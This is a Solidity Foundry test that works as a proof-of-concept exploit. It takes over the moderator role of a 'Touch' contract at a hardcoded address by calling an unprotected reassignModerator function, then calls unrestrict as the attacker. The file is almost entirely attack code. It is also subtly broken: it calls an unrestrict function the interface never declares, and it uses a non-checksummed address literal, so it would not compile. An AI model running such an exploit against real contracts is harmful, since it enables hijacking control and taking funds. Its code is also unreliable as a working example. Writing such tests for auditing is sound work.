```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Minimal interface for the vulnerable Touch contract
interface ITouch {
    function moderator() external view returns (address);
    function reassignModerator(address newModerator) external;
    function extract(address _token) external returns (bool);
    function unrestricted() external view returns (bool);
    function balanceOf(address owner) external view returns (uint256);
    // other functions not needed for exploit
}

contract ExploitTest is Test {
    address constant TOUCH = 0x5e0af01930c8dc676a6dc7133bd86370a0be3953;
    address attacker = address(0xDEAD);

    function setUp() public {
        vm.label(TOUCH, "Touch");
        vm.label(attacker, "Attacker");
    }

    function testUnprotectedModerator() public {
        ITouch touch = ITouch(TOUCH);

        // Record initial moderator
        address initialModerator = touch.moderator();
        emit log_named_address("Initial moderator", initialModerator);

        // Attacker reassigns moderator to themselves
        vm.prank(attacker);
        touch.reassignModerator(attacker);

        // Verify that attacker is now the moderator
        address newModerator = touch.moderator();
        assertEq(newModerator, attacker, "Moderator should be attacker");

        // Demonstrate further control: attacker can now call extract on any token
        // (Assuming there is a token with some balance in the contract, but not required)
        // Just proving the moderator was hijacked
        vm.prank(attacker);
        touch.unrestrict(); // attacker can also call restrict/unrestrict
        bool unrestrictStatus = touch.unrestricted();
        assertTrue(unrestrictStatus, "Unrestricted should be true after attacker calls unrestrict");
    }
}
```
